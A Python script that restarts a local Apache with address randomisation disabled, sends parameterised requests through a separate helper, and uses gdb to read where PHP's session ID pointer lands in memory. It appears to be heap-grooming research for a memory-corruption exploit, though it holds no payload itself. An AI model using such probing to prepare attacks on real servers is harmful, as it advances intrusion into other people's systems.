#!/usr/bin/env python3
import subprocess,re,time
def sh(c): return subprocess.run(c,shell=True,capture_output=True,text=True)
def stopstart():
    sh("sudo -n apache2ctl -k stop"); time.sleep(0.18)
    sh('sudo -n bash -c "setarch $(uname -m) -R /usr/sbin/apache2ctl -k start"'); time.sleep(0.22)
def getid():
    pid=sh('pgrep -f "^/usr/sbin/apache2 -k start" | tail -1').stdout.strip()
    if not pid: return None
    out=sh(f"sudo -n gdb -q -p {pid} -batch -ex 'p/x (unsigned long)ps_globals.id' 2>/dev/null").stdout
    m=re.search(r'\$\d+ = (0x[0-9a-f]+)',out); return int(m.group(1),16) if m else None
cases=[]
for spec in [0,1,100,500,900,998,999]:
    cases.append((spec,39,32))
for specnl in [33,34,35,36,37,38,39]:
    cases.append((500,specnl,32))
for spec in [500]:
    for specvl in [31,30,64,40,39,38]:
        cases.append((spec,5,specvl))
for spec,specnl,specvl in cases:
    stopstart()
    sh(f"python3 send_a_mix.py 1001 5 32 12 17 {spec} {specnl} {specvl} >/dev/null 2>&1"); time.sleep(0.15)
    a=getid()
    if a:
        off=a&0xfff
        print(f"SPEC={spec} NL={specnl} VL={specvl} ID=0x{a:x} PAGEOFF=0x{off:x} OFF56={off%56:#x}")
    else:
        print(f"SPEC={spec} NL={specnl} VL={specvl} ID=?")
